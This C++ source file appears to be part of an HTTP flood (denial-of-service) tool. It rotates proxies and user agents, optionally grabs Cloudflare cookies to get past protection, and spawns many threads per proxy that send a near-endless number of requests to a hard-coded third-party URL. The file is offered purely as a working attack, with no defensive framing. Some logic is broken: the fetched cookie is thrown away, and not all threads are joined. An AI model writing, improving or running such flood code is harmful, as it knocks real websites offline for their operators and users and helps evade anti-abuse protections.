

#include <iostream> 
#include <vector> 
#include <thread> 
#include <windows.h>
#include <unordered_map>
#include <fstream>
#include <format>
#include "mainFuncs.h"
#include <atomic>

struct data {
    std::string ip;
    int port;
    std::string user;
    std::string pass;
    std::string useragent;
    std::string cookie;
};

std::atomic_bool stop_thread_1 = false;

std::unordered_map<std::string, data> dataMap;
std::vector<std::pair<std::pair<std::string, int>, std::pair<std::string, std::string>>> proxies;
std::vector<std::string> usa;

void attackSetup( const int max_thread, const std::string& urls, const std::string& urlcookie, const std::string& uaname, const std::string& prxyname, const bool cookieCheck) {
    const std::string url = urls;
    const std::string url_forcookie = urlcookie;



    usa = addUserAgents(uaname, usa);
    proxies = addProxies(prxyname, proxies);


    for (const std::pair i : proxies) {
        std::string ua = getRandomUserAgent(usa);
        std::string cookie;
        if (cookieCheck == true)
            cookie = cfCookieCurl(ua, url_forcookie, i.first.first, std::to_string(i.first.second));
        else
            cookie = "";
        data d1 = { i.first.first, i.first.second, i.second.first, i.second.second, ua,"" };
        dataMap[d1.ip] = d1;
    }



    std::vector<std::thread> threads;
    for (auto i = dataMap.begin(); i != dataMap.end(); i++) {
        std::string t = std::format("http://{}:{}", i->second.ip, i->second.port);
        std::string f = std::format("{}:{}", i->second.user, i->second.pass);
        std::string ua = i->second.useragent;
        std::string cookie = i->second.cookie;

        //std::cout << std::endl << "Rate limit sınırı = " << rateCheck(url, t, f, ua, cookie);


        std::cout << "ip port = " << t << std::endl << " f = " << f << std::endl << " ua =" << ua << std::endl << " Cookie:" << cookie << std::endl;
        for (int i = 0; i < max_thread; i++) {
            /*
            std::thread th(cfPost, url, t, f, ua, cookie, "trackNumber=1231231241231");
            threads.emplace_back(move(th));
            */
            std::thread ths(performCurlRequest, "https://lpthizlibilgilndrme.com/veri.php?ip=1.1.1.1", t, f, ua, cookie, 99999999999);
            threads.emplace_back(move(ths));

        }
    }
    std::cout << "THREAD SIZE: " << max_thread;
    for (int i = 0; i < max_thread; i++) {
        threads[i].join();
    }
}